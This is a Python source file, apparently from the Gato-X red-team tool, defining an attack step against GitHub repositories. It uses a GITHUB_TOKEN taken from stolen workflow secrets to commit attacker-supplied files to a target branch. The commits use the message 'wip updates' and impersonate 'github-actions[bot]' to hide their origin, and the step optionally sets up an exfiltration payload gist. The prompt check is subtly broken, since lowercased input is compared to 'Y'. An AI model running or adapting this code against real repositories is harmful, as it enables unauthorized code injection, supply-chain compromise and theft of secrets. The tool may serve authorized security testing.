import os

from gatox.attack.pwnrequest.steps.attack_step import AttackStep
from gatox.cli.output import Output
from gatox.attack.utilities import AttackUtilities


class FeatureBranch(AttackStep):
    """Represents using a PAT or GITHUB_TOKEN with contents
    write access to create a feature branch and commit changes to it.
    """

    def __init__(self, target: str, branch_name: str, files: list):
        self.target = target
        self.branch_name = branch_name
        self.files = files
        self.step_data = f"Create Feature Branch: {target}:{branch_name}"

    def setup(self, api):

        Output.info("Validating files to create in feature branch.")
        for file in self.files:
            if not os.path.exists(file["local_path"]):
                Output.error(f"File {file['local_path']} does not exist!")
                return False

        Output.info(
            "Will you need to add a Gato-X managed exfiltration payload to a file?"
        )
        Output.info("Enter 'Y' or 'N'.")

        user_input = input()
        if user_input.lower() == "Y":
            AttackUtilities.create_exfil_gist(api, self.credential, 10)
            Output.info("Enter 'Confirm' when ready to continue.")

            user_input = input()
            if user_input.lower() != "confirm":
                Output.warn("Exiting attack!")
                return False
        else:
            Output.info("No exfiltration payload created.")

        return True

    @AttackStep.require_params("secrets")
    def preflight(self, api, secrets=None):
        # Validate the GITHUB_TOKEN
        self.credential = secrets["values"]["system.github.token"]

        status = api.call_get(
            f"/installation/repositories", credential_override=self.credential
        )
        if status.status_code == 401:
            Output.error("Token invalid or expired!")
            return False

        return True

    def execute(self, api):
        """Execute the step after validating pre-conditions."""
        # Create branch if it does not exist
        for file in self.files:
            with open(file["local_path"], "rb") as f:
                contents = f.read()

            if contents:
                status = api.commit_file(
                    self.target,
                    self.branch_name,
                    file["name"],
                    contents,
                    message="wip updates",
                    credential_override=self.credential,
                    commit_author="github-actions[bot]",
                    commit_email="github-actions[bot]@users.noreply.github.com",
                )

                if not status:
                    Output.error(f"Failed to commit file {file['local_path']}!")
                    return False
            else:
                Output.error(f"Failed to read contents of file {file['local_path']}!")
                return False

        return True
